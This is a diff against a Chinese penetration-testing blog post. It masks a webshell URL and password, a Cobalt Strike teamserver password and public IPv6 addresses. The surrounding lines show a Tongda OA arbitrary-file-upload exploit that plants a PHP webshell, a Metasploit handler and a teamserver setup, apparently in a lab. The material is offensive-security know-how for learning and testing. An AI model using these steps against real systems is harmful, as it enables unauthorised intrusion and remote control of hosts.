@@ -36,12 +36,11 @@ tags: [安全, 渗透测试, 反连, CobaltStrike]
 
 利用（Tongda_Ispirit_AnyFileUpload）漏洞，发送木马
 
-![利用任意文件上传漏洞传 shell.php](/img/posts/reverse-shell/03-upload-shell.webp)
 
 ```
 [+]http://10.43.55.160存在通达OA ispirit后台任意文件上传漏洞(Tongda_Ispirit_AnyFileUpload)
-蚁剑:http://10.43.55.160/im/2611/1084598659.1169907.php
-密码:@xiaokp7
+蚁剑:http://10.43.55.160/im/2611/******.php
+密码:******
 编码器:base64
 ```
 
@@ -112,7 +111,7 @@ msf exploit(multi/handler) > run
 创建 监听 （此时 kali 为跳板机）
 
 ```bash
-./teamserver 10.43.55.249 kali   # ./teamserver <ip> <密码>   
+./teamserver 10.43.55.249 ******   # ./teamserver <ip> <密码>   
 ```
 
 在 客户机 上接收：
@@ -159,8 +158,8 @@ Windows IP 配置
 以太网适配器 本地连接:
 
    连接特定的 DNS 后缀 . . . . . . . : 
-   IPv6 地址 . . . . . . . . . . . . : 2408:845d:3b40:1729:ccf8:2ce4:5305:dd99
-   临时 IPv6 地址. . . . . . . . . . : 2408:845d:3b40:1729:d149:e079:d158:e404
+   IPv6 地址 . . . . . . . . . . . . : ******
+   临时 IPv6 地址. . . . . . . . . . : ******
    本地链接 IPv6 地址. . . . . . . . : fe80::ccf8:2ce4:5305:dd99%11
    IPv4 地址 . . . . . . . . . . . . : 10.43.55.160
    子网掩码  . . . . . . . . . . . . : 255.255.255.0
